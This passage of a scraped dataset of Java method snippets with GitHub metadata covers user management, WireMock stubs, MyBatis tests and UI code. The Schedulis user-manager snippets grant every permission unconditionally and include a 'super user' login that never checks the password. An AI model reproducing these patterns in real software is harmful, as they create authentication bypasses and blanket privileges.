Role> roles) {    final NamedNodeMap roleAttrMap = node.getAttributes();    final Node roleNameAttr = roleAttrMap.getNamedItem(ROLENAME_ATTR);    if (roleNameAttr == null) {      throw new RuntimeException(          \"Error loading role. The role 'name' attribute doesn't exist\");    }    final Node permissionAttr = roleAttrMap.getNamedItem(ROLEPERMISSIONS_ATTR);    if (permissionAttr == null) {      throw new RuntimeException(          \"Error loading role. The role 'permissions' attribute doesn't exist\");    }    final String roleName = roleNameAttr.getNodeValue();    final String permissions = permissionAttr.getNodeValue();    final String[] permissionSplit = permissions.split(\"\\\\s*,\\\\s*\");    final Permission perm = new Permission();    for (final String permString : permissionSplit) {      try {        final Permission.Type type = Permission.Type.valueOf(permString);        perm.addPermission(type);      } catch (final IllegalArgumentException e) {        logger.error(\"Error adding type \" + permString            + \". Permission doesn't exist.\", e);      }    }    final Role role = new Role(roleName, perm);    roles.put(roleName, role);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/user/WebankXmlUserManager.java", "stars": "18", "class": {"name": "WebankXmlUserManager", "extends": null, "implements": ["UserManager"], "modifiers": ["public"]}}, {"method_name": "getUser", "params": ["String", "String"], "throws": ["UserManagerException"], "modifiers": ["public"], "return_type": "User", "snippet": "  public User getUser(final String username, final String password)      throws UserManagerException {    if (username == null || username.trim().isEmpty()) {      throw new UserManagerException(\"Empty User Name\");    } else if (password == null || password.trim().isEmpty()) {      throw new UserManagerException(\"Empty Password\");    }    // Minimize the synchronization of the get. Shouldn't matter if it    // doesn't exist.    String foundUsername = null;    User user = null;    synchronized (this) {      parseXMLFile();      foundUsername = this.userPassword.get(username);      if (foundUsername != null) {        user = this.users.get(username);      }    }    //LADP check login//    if(foundUsername == null || \"\".equals(foundUsername)){//      throw new UserManagerException(\"\u7528\u6237\u540d/\u5bc6\u7801\u4e0d\u5b58\u5728.\");//    }////    if (!LdapCheckCenter.checkLogin(props, foundUsername, password)) {//      throw new UserManagerException(\"\u5bc6\u7801\u9519\u8bef.\");//    }    // Once it gets to this point, no exception has been thrown. User    // shoudn't be    // null, but adding this check for if user and user/password hash tables    // go    // out of sync.//    if (user == null) {//      throw new UserManagerException(\"\u7f51\u7edc\u9519\u8bef: \u672a\u53d1\u73b0\u7528\u6237.\");//    }    if(foundUsername == null || \"\".equals(foundUsername) ||        !LdapCheckCenter.checkLogin(props, foundUsername, password) ||        user == null){      throw new UserManagerException(\"Error User Name Or Password\");    }    // Add all the roles the group has to the user    resolveGroupRoles(user);    user.setPermissions(new UserPermissions() {      @Override      public boolean hasPermission(final String permission) {        return true;      }      @Override      public void addPermission(final String permission) {      }    });    return user;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/user/WebankXmlUserManager.java", "stars": "18", "class": {"name": "WebankXmlUserManager", "extends": null, "implements": ["UserManager"], "modifiers": ["public"]}}, {"method_name": "getUser", "params": ["String", "String", "String"], "throws": ["UserManagerException"], "modifiers": ["public"], "return_type": "User", "snippet": "  public User getUser(String username, String password, String superUser) throws UserManagerException {    if (org.apache.commons.lang.StringUtils.isBlank(username)) {      throw new UserManagerException(\"Empty User Name\");    }    // Minimize the synchronization of the get. Shouldn't matter if it    // doesn't exist.    String foundUsername = null;    User user = null;    synchronized (this) {      parseXMLFile();      foundUsername = this.userPassword.get(username);      if (foundUsername != null) {        user = this.users.get(username);      }    }    if(foundUsername == null || \"\".equals(foundUsername) || user == null){      throw new UserManagerException(\"super user login failed\");    }    // Add all the roles the group has to the user    resolveGroupRoles(user);    user.setPermissions(new UserPermissions() {      @Override      public boolean hasPermission(final String permission) {        return true;      }      @Override      public void addPermission(final String permission) {      }    });    return user;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/user/WebankXmlUserManager.java", "stars": "18", "class": {"name": "WebankXmlUserManager", "extends": null, "implements": ["UserManager"], "modifiers": ["public"]}}, {"method_name": "resolveGroupRoles", "params": ["User"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void resolveGroupRoles(final User user) {    for (final String group : user.getGroups()) {      final Set<String> groupRoleSet = this.groupRoles.get(group);      if (groupRoleSet != null) {        for (final String role : groupRoleSet) {          user.addRole(role);        }      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/user/WebankXmlUserManager.java", "stars": "18", "class": {"name": "WebankXmlUserManager", "extends": null, "implements": ["UserManager"], "modifiers": ["public"]}}, {"method_name": "parseGroupRoleTag", "params": ["Node", "HashMap<String,Set>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parseGroupRoleTag(final Node node,      final HashMap<String, Set<String>> groupRoles) {    final NamedNodeMap groupAttrMap = node.getAttributes();    final Node groupNameAttr = groupAttrMap.getNamedItem(GROUPNAME_ATTR);    if (groupNameAttr == null) {      throw new RuntimeException(          \"Error loading role. The role 'name' attribute doesn't exist\");    }    final String groupName = groupNameAttr.getNodeValue();    final Set<String> roleSet = new HashSet<>();    final Node roles = groupAttrMap.getNamedItem(ROLES_ATTR);    if (roles != null) {      final String value = roles.getNodeValue();      final String[] roleSplit = value.split(\"\\\\s*,\\\\s*\");      for (final String role : roleSplit) {        roleSet.add(role);      }    }    groupRoles.put(groupName, roleSet);    logger.info(\"Group roles \" + groupName + \" added.\");  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/user/WebankXmlUserManager.java", "stars": "18", "class": {"name": "WebankXmlUserManager", "extends": null, "implements": ["UserManager"], "modifiers": ["public"]}}, {"method_name": "validateUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean validateUser(final String username) {    return this.users.containsKey(username);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/user/WebankXmlUserManager.java", "stars": "18", "class": {"name": "WebankXmlUserManager", "extends": null, "implements": ["UserManager"], "modifiers": ["public"]}}, {"method_name": "getRole", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Role", "snippet": "  public Role getRole(final String roleName) {    return this.roles.get(roleName);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/user/WebankXmlUserManager.java", "stars": "18", "class": {"name": "WebankXmlUserManager", "extends": null, "implements": ["UserManager"], "modifiers": ["public"]}}, {"method_name": "validateGroup", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean validateGroup(final String group) {    // Return true. Validation should be added when groups are added to the xml.    return true;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/user/WebankXmlUserManager.java", "stars": "18", "class": {"name": "WebankXmlUserManager", "extends": null, "implements": ["UserManager"], "modifiers": ["public"]}}, {"method_name": "validateProxyUser", "params": ["String", "User"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean validateProxyUser(final String proxyUser, final User realUser) {    if (this.proxyUserMap.containsKey(realUser.getUserId())        && this.proxyUserMap.get(realUser.getUserId()).contains(proxyUser)) {      return true;    } else {      return false;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/user/WebankXmlUserManager.java", "stars": "18", "class": {"name": "WebankXmlUserManager", "extends": null, "implements": ["UserManager"], "modifiers": ["public"]}}, {"method_name": "getBinaryFileNamed", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "BinaryFile", "snippet": "  public BinaryFile getBinaryFileNamed(String name) {    try {      return new BinaryFile(toUri(name)) {        @Override        public InputStream getStream() {          return jcrFileReader.readStream(name);        }      };    } catch (Exception e) {      LOG.error(\"AEM Stubs cannot read file {}\", name, e);      throw new IllegalStateException(e);    }  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockFileSource.java", "stars": "8", "class": {"name": "WireMockFileSource", "extends": null, "implements": ["FileSource"], "modifiers": []}}, {"method_name": "getTextFileNamed", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "TextFile", "snippet": "  public TextFile getTextFileNamed(String name) {    try {      return new TextFile(toUri(name)) {        @Override        public InputStream getStream() {          return jcrFileReader.readStream(name);        }      };    } catch (Exception e) {      LOG.error(\"AEM Stubs cannot read file {}\", name, e);      throw new IllegalStateException(e);    }  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockFileSource.java", "stars": "8", "class": {"name": "WireMockFileSource", "extends": null, "implements": ["FileSource"], "modifiers": []}}, {"method_name": "createIfNecessary", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void createIfNecessary() {    //ignore  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockFileSource.java", "stars": "8", "class": {"name": "WireMockFileSource", "extends": null, "implements": ["FileSource"], "modifiers": []}}, {"method_name": "child", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "FileSource", "snippet": "  public FileSource child(String subDirectoryName) {    return this;  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockFileSource.java", "stars": "8", "class": {"name": "WireMockFileSource", "extends": null, "implements": ["FileSource"], "modifiers": []}}, {"method_name": "getPath", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getPath() {    return rootPath;  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockFileSource.java", "stars": "8", "class": {"name": "WireMockFileSource", "extends": null, "implements": ["FileSource"], "modifiers": []}}, {"method_name": "getUri", "params": [], "throws": null, "modifiers": ["public"], "return_type": "URI", "snippet": "  public URI getUri() {    try {      return toUri(rootPath);    } catch (URISyntaxException e) {      LOG.error(\"AEM Stubs cannot create URI\", e);      throw new IllegalStateException(e);    }  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockFileSource.java", "stars": "8", "class": {"name": "WireMockFileSource", "extends": null, "implements": ["FileSource"], "modifiers": []}}, {"method_name": "listFilesRecursively", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<TextFile>", "snippet": "  public List<TextFile> listFilesRecursively() {    return listFiles(rootPath);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockFileSource.java", "stars": "8", "class": {"name": "WireMockFileSource", "extends": null, "implements": ["FileSource"], "modifiers": []}}, {"method_name": "listFiles", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "List<TextFile>", "snippet": "  private List<TextFile> listFiles(String folderPath) {    return resolverAccessor.resolve(resourceResolver -> {      return StreamUtils.from(resourceResolver.getResource(folderPath).getChildren().iterator())        .flatMap(resource -> {          if (resource.isResourceType(\"sling:Folder\")) {            return listFiles(resource.getPath()).stream();          } else {            if (resource.isResourceType(\"nt:file\")) {              return Stream.of(new WireMockFileSource(this.resolverAccessor, folderPath)                .getTextFileNamed(resource.getName()));            } else {              return Stream.empty();            }          }        })        .collect(Collectors.toList());    });  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockFileSource.java", "stars": "8", "class": {"name": "WireMockFileSource", "extends": null, "implements": ["FileSource"], "modifiers": []}}, {"method_name": "writeTextFile", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void writeTextFile(String name, String contents) {    //ignore  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockFileSource.java", "stars": "8", "class": {"name": "WireMockFileSource", "extends": null, "implements": ["FileSource"], "modifiers": []}}, {"method_name": "writeBinaryFile", "params": ["String", "byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void writeBinaryFile(String name, byte[] contents) {    //ignore  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockFileSource.java", "stars": "8", "class": {"name": "WireMockFileSource", "extends": null, "implements": ["FileSource"], "modifiers": []}}, {"method_name": "exists", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean exists() {    return true;  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockFileSource.java", "stars": "8", "class": {"name": "WireMockFileSource", "extends": null, "implements": ["FileSource"], "modifiers": []}}, {"method_name": "deleteFile", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void deleteFile(String name) {    //ignore  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockFileSource.java", "stars": "8", "class": {"name": "WireMockFileSource", "extends": null, "implements": ["FileSource"], "modifiers": []}}, {"method_name": "toUri", "params": ["String"], "throws": ["URISyntaxException"], "modifiers": ["private"], "return_type": "URI", "snippet": "  private URI toUri(String name) throws URISyntaxException {    String absolutePath = jcrFileReader.getAbsolutePath(name);    return new URI(\"aem\", null, absolutePath, null);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockFileSource.java", "stars": "8", "class": {"name": "WireMockFileSource", "extends": null, "implements": ["FileSource"], "modifiers": []}}, {"method_name": "eat", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void eat()\t{\t\t//\u6240\u6709\u5ba0\u7269\u90fd\u53ef\u4ee5\u5403\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/duotai/Pet.java", "stars": "2", "class": {"name": "Pet", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateItem", "params": ["String", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void updateItem(String item, boolean empty) {        super.updateItem(item, empty);        setText(null);  // No text in label of super class        if (empty) {            lastItem = null;            setGraphic(null);        } else {            lastItem = item;            message.setText(item != null ? item : \"<null>\");            setGraphic(hbox);        }        if (message.getText().startsWith(\"*\")) {            downloadButton.setDisable(false);            downloadButton.setVisible(true);        } else {            downloadButton.setDisable(true);            downloadButton.setVisible(false);        }    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/UserInterface/CustomCell.java", "stars": "2", "class": {"name": "CustomCell", "extends": "ListCell", "implements": null, "modifiers": ["public"]}}, {"method_name": "setUp", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void setUp() throws Exception {    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/batch_keys/Config.xml\")) {      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);    }    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),            \"org/apache/ibatis/submitted/batch_keys/CreateDB.sql\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/batch_keys/BatchKeysTest.java", "stars": "15", "class": {"name": "BatchKeysTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testJdbc3Support", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void testJdbc3Support() throws Exception {    try (Connection conn = sqlSessionFactory.getConfiguration().getEnvironment().getDataSource().getConnection();         PreparedStatement stmt = conn.prepareStatement(\"insert into users2 values(null, 'Pocoyo')\", Statement.RETURN_GENERATED_KEYS)) {      stmt.addBatch();      stmt.executeBatch();      try (ResultSet rs = stmt.getGeneratedKeys()) {        if (rs.next()) {          ResultSetMetaData rsmd = rs.getMetaData();          int colCount = rsmd.getColumnCount();          do {            for (int i = 1; i <= colCount; i++) {              String key = rs.getString(i);              System.out.println(\"key \" + i + \" is \" + key);            }          } while (rs.next());        } else {          System.out.println(\"There are no generated keys.\");        }      }    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/batch_keys/BatchKeysTest.java", "stars": "15", "class": {"name": "BatchKeysTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testInsert", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testInsert() {    try (SqlSession sqlSession = sqlSessionFactory.openSession(ExecutorType.BATCH)) {      User user1 = new User(null, \"Pocoyo\");      sqlSession.insert(\"insert\", user1);      User user2 = new User(null, \"Valentina\");      sqlSession.insert(\"insert\", user2);      sqlSession.flushStatements();      assertEquals(Integer.valueOf(50), user1.getId());      assertEquals(Integer.valueOf(50), user2.getId());      sqlSession.commit();    }    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      List<User> users = sqlSession.selectList(\"select\");      Assertions.assertEquals( 2, users.size());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/batch_keys/BatchKeysTest.java", "stars": "15", "class": {"name": "BatchKeysTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testInsertJdbc3", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testInsertJdbc3() {    try (SqlSession sqlSession = sqlSessionFactory.openSession(ExecutorType.BATCH)) {      User user1 = new User(null, \"Pocoyo\");      sqlSession.insert(\"insertIdentity\", user1);      User user2 = new User(null, \"Valentina\");      sqlSession.insert(\"insertIdentity\", user2);      sqlSession.flushStatements();      assertEquals(Integer.valueOf(0), user1.getId());      assertEquals(Integer.valueOf(1), user2.getId());      sqlSession.commit();    }    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      List<User> users = sqlSession.selectList(\"selectIdentity\");      Assertions.assertEquals(2, users.size());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/batch_keys/BatchKeysTest.java", "stars": "15", "class": {"name": "BatchKeysTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testInsertWithMapper", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testInsertWithMapper() {    try (SqlSession sqlSession = sqlSessionFactory.openSession(ExecutorType.BATCH)) {      Mapper userMapper = sqlSession.getMapper(Mapper.class);      User user1 = new User(null, \"Pocoyo\");      userMapper.insert(user1);      User user2 = new User(null, \"Valentina\");      userMapper.insert(user2);      sqlSession.flushStatements();      assertEquals(Integer.valueOf(50), user1.getId());      assertEquals(Integer.valueOf(50), user2.getId());      sqlSession.commit();    }    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      List<User> users = sqlSession.selectList(\"select\");      Assertions.assertEquals(2, users.size());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/batch_keys/BatchKeysTest.java", "stars": "15", "class": {"name": "BatchKeysTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testInsertMapperJdbc3", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testInsertMapperJdbc3() {    try (SqlSession sqlSession = sqlSessionFactory.openSession(ExecutorType.BATCH)) {      Mapper userMapper = sqlSession.getMapper(Mapper.class);      User user1 = new User(null, \"Pocoyo\");      userMapper.insertIdentity(user1);      User user2 = new User(null, \"Valentina\");      userMapper.insertIdentity(user2);      sqlSession.flushStatements();      assertEquals(Integer.valueOf(0), user1.getId());      assertEquals(Integer.valueOf(1), user2.getId());      sqlSession.commit();    }    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      List<User> users = sqlSession.selectList(\"selectIdentity\");      Assertions.assertEquals(2, users.size());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/batch_keys/BatchKeysTest.java", "stars": "15", "class": {"name": "BatchKeysTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testInsertMapperNoBatchJdbc3", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testInsertMapperNoBatchJdbc3() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper userMapper = sqlSession.getMapper(Mapper.class);      User user1 = new User(null, \"Pocoyo\");      userMapper.insertIdentity(user1);      assertEquals(Integer.valueOf(0), user1.getId());      sqlSession.commit();    }    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      List<User> users = sqlSession.selectList(\"selectIdentity\");      Assertions.assertEquals(1, users.size());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/batch_keys/BatchKeysTest.java", "stars": "15", "class": {"name": "BatchKeysTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "initialize", "params": ["Context", "StarDriverResult"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize(Context context, StarDriverResult result) {        try {            Thread.sleep(166);        } catch (InterruptedException e) {            result.success = false;            result.errorMessage = e.toString();            return;        }        result.success = true;    }", "url": "https://raw.githubusercontent.com/succlz123/StarDriver-APT/master/app/src/main/java/org/succlz123/stardriver/app/task/AppInitTaskSDKA.java", "stars": "4", "class": {"name": "AppInitTaskSDKA", "extends": "IStarDriver", "implements": null, "modifiers": ["public"]}}, {"method_name": "onDraw", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {        super.onDraw(canvas);//        \u7ec3\u4e60\u5185\u5bb9\uff1a\u4f7f\u7528 canvas.drawLine() \u65b9\u6cd5\u753b\u76f4\u7ebf        canvas.drawLine(100, 100, 500, 500, paint);    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson1/Practice6DrawLineView.java", "stars": "2", "class": {"name": "Practice6DrawLineView", "extends": "View", "implements": null, "modifiers": ["public"]}}, {"method_name": "update", "params": ["Statement"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int update(Statement statement) throws SQLException {    CallableStatement cs = (CallableStatement) statement;    cs.execute();    int rows = cs.getUpdateCount();    Object parameterObject = boundSql.getParameterObject();    KeyGenerator keyGenerator = mappedStatement.getKeyGenerator();    keyGenerator.processAfter(executor, mappedStatement, cs, parameterObject);    resultSetHandler.handleOutputParameters(cs);    return rows;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/CallableStatementHandler.java", "stars": "15", "class": {"name": "CallableStatementHandler", "extends": "BaseStatementHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "batch", "params": ["Statement"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void batch(Statement statement) throws SQLException {    CallableStatement cs = (CallableStatement) statement;    cs.addBatch();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/CallableStatementHandler.java", "stars": "15", "class": {"name": "CallableStatementHandler", "extends": "BaseStatementHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "query", "params": ["Statement", "ResultHandler"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "List<E>", "snippet": "  public <E> List<E> query(Statement statement, ResultHandler resultHandler) throws SQLException {    CallableStatement cs = (CallableStatement) statement;    cs.execute();    List<E> resultList = resultSetHandler.handleResultSets(cs);    resultSetHandler.handleOutputParameters(cs);    return resultList;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/CallableStatementHandler.java", "stars": "15", "class": {"name": "CallableStatementHandler", "extends": "BaseStatementHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "queryCursor", "params": ["Statement"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Cursor<E>", "snippet": "  public <E> Cursor<E> queryCursor(Statement statement) throws SQLException {    CallableStatement cs = (CallableStatement) statement;    cs.execute();    Cursor<E> resultList = resultSetHandler.handleCursorResultSets(cs);    resultSetHandler.handleOutputParameters(cs);    return resultList;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/CallableStatementHandler.java", "stars": "15", "class": {"name": "CallableStatementHandler", "extends": "BaseStatementHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "instantiateStatement", "params": ["Connection"], "throws": ["SQLException"], "modifiers": ["protected"], "return_type": "Statement", "snippet": "  protected Statement instantiateStatement(Connection connection) throws SQLException {    String sql = boundSql.getSql();    if (mappedStatement.getResultSetType() == ResultSetType.DEFAULT) {      return connection.prepareCall(sql);    } else {      return connection.prepareCall(sql, mappedStatement.getResultSetType().getValue(), ResultSet.CONCUR_READ_ONLY);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/CallableStatementHandler.java", "stars": "15", "class": {"name": "CallableStatementHandler", "extends": "BaseStatementHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "parameterize", "params": ["Statement"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void parameterize(Statement statement) throws SQLException {    registerOutputParameters((CallableStatement) statement);    parameterHandler.setParameters((CallableStatement) statement);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/CallableStatementHandler.java", "stars": "15", "class": {"name": "CallableStatementHandler", "extends": "BaseStatementHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "registerOutputParameters", "params": ["CallableStatement"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void registerOutputParameters(CallableStatement cs) throws SQLException {    List<ParameterMapping> parameterMappings = boundSql.getParameterMappings();    for (int i = 0, n = parameterMappings.size(); i < n; i++) {      ParameterMapping parameterMapping = parameterMappings.get(i);      if (parameterMapping.getMode() == ParameterMode.OUT || parameterMapping.getMode() == ParameterMode.INOUT) {        if (null == parameterMapping.getJdbcType()) {          throw new ExecutorException(\"The JDBC Type must be specified for output parameter.  Parameter: \" + parameterMapping.getProperty());        } else {          if (parameterMapping.getNumericScale() != null && (parameterMapping.getJdbcType() == JdbcType.NUMERIC || parameterMapping.getJdbcType() == JdbcType.DECIMAL)) {            cs.registerOutParameter(i + 1, parameterMapping.getJdbcType().TYPE_CODE, parameterMapping.getNumericScale());          } else {            if (parameterMapping.getJdbcTypeName() == null) {              cs.registerOutParameter(i + 1, parameterMapping.getJdbcType().TYPE_CODE);            } else {              cs.registerOutParameter(i + 1, parameterMapping.getJdbcType().TYPE_CODE, parameterMapping.getJdbcTypeName());            }          }        }      }    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/CallableStatementHandler.java", "stars": "15", "class": {"name": "CallableStatementHandler", "extends": "BaseStatementHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getType() {        return type;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/CreateChannelRequest.java", "stars": "1", "class": {"name": "CreateChannelRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setType", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setType(int type) {        this.type = type;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/CreateChannelRequest.java", "stars": "1", "class": {"name": "CreateChannelRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getRemoteUserId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getRemoteUserId() {        return remoteUserId;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/CreateChannelRequest.java", "stars": "1", "class": {"name": "CreateChannelRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setRemoteUserId", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRemoteUserId(String remoteUserId) {        this.remoteUserId = remoteUserId;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/CreateChannelRequest.java", "stars": "1", "class": {"name": "CreateChannelRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPlatform", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Platform", "snippet": "    public Platform getPlatform() {        return platform;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/CreateChannelRequest.java", "stars": "1", "class": {"name": "CreateChannelRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setPlatform", "params": ["Platform"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void 